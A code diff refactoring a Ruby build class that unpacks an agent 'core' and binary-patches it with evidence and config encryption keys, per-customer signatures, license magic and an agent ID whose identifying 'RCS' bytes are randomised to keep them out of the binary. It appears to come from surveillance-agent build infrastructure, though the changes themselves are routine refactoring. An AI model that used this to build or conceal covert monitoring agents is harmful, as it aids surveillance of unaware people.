@@ -26,6 +26,7 @@ class Build
   attr_reader :platform
   attr_reader :tmpdir
   attr_reader :factory
+  attr_reader :core_filepath
 
   @builders = {}
 
@@ -57,21 +58,21 @@ class Build
     core = ::Core.where({name: @platform}).first
     raise "Core for #{@platform} not found" if core.nil?
 
-    @core = GridFS.to_tmp core[:_grid]
-    trace :info, "Build: loaded core: #{@platform} #{core.version} #{File.size(@core)} bytes"
+    @core_filepath = GridFS.to_tmp core[:_grid]
+    trace :info, "Build: loaded core: #{@platform} #{core.version} #{File.size(@core_filepath)} bytes"
 
-    if params
-      @factory = ::Item.where({_kind: 'factory', _id: params['_id']}).first
-      raise "Factory #{params['ident']} not found" if @factory.nil?
-      trace :debug, "Build: loaded factory: #{@factory.name}"
-      raise "Factory too old cannot be created" unless @factory.good
-    end
+    return if params.blank?
+
+    @factory = ::Item.where({_kind: 'factory', _id: params['_id']}).first
+    raise "Factory #{params['ident']} not found" if @factory.nil?
+    trace :debug, "Build: loaded factory: #{@factory.name}"
+    raise "Factory too old cannot be created" unless @factory.good
   end
 
   def unpack
-    trace :debug, "Build: unpack: #{@core}"
+    trace :debug, "Build: unpack: #{@core_filepath}"
 
-    Zip::ZipFile.open(@core) do |z|
+    Zip::ZipFile.open(@core_filepath) do |z|
       z.each do |f|
         f_path = path(f.name)
         FileUtils.mkdir_p(File.dirname(f_path))
@@ -85,7 +86,11 @@ class Build
     end
 
     # delete the tmpfile of the core
-    FileUtils.rm_rf @core
+    FileUtils.rm_rf @core_filepath
+  end
+
+  def hash_and_salt value
+    Digest::MD5.digest(value) + SecureRandom.random_bytes(16)
   end
 
   def patch(params)
@@ -100,7 +105,7 @@ class Build
 
     # evidence encryption key
     begin
-      key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
+      key = hash_and_salt @factory.logkey
       content.binary_patch 'WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg', key
     rescue
       raise "Evidence key marker not found"
@@ -108,7 +113,7 @@ class Build
 
     # conf encryption key
     begin
-      key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
+      key = hash_and_salt @factory.confkey
       content.binary_patch '6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY', key
     rescue
       raise "Config key marker not found"
@@ -117,10 +122,10 @@ class Build
     # per-customer signature
     begin
       sign = ::Signature.where({scope: 'agent'}).first
-      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+      signature = hash_and_salt sign.value
 
       marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
-      magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+      magic = license_magic + marker.slice(8..-1)
 
       content.binary_patch magic, signature
     rescue Exception => e
@@ -133,8 +138,8 @@ class Build
       # first three bytes are random to avoid the RCS string in the binary file
       id['RCS_'] = SecureRandom.hex(2)
       content.binary_patch 'EMp7Ca7-fpOBIr', id
-    rescue
-      raise "Agent ID marker not found"
+    rescue Exception => e
+      raise "Agent ID marker not found: #{e.message}"
     end
 
     # demo parameters
@@ -146,7 +151,7 @@ class Build
 
     # magic random seed (magic + random)
     begin
-      magic = LicenseManager.instance.limits[:magic] + SecureRandom.urlsafe_base64(32)
+      magic = license_magic + SecureRandom.urlsafe_base64(32)
       magic = magic.slice(0..31)
       content.binary_patch 'B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW', magic
     rescue
@@ -239,11 +244,15 @@ class Build
     File.join @tmpdir, name
   end
 
+  def license_magic
+    LicenseManager.instance.limits[:magic]
+  end
+
   def add_magic(content)
     # per-customer signature
     begin
       marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
-      magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+      magic = license_magic + marker.slice(8..-1)
       content.binary_patch marker, magic
     rescue
       raise "Signature marker not found"
@@ -257,11 +266,15 @@ class Build
     end
   end
 
+  def archive_mode?
+    LicenseManager.instance.check :archive
+  end
+
   def create(params)
     trace :debug, "Building Agent: #{params}"
 
     # if we are in archive mode, no build is allowed
-    raise "Cannot build on this system" if LicenseManager.instance.check :archive
+    raise "Cannot build on this system" if archive_mode?
 
     begin
       load params['factory']
@@ -277,11 +290,9 @@ class Build
       trace :error, "Cannot build: #{e.message}"
       trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
       clean
-      raise 
+      raise e
     end
-    
   end
-
 end
 
 # require all the builders
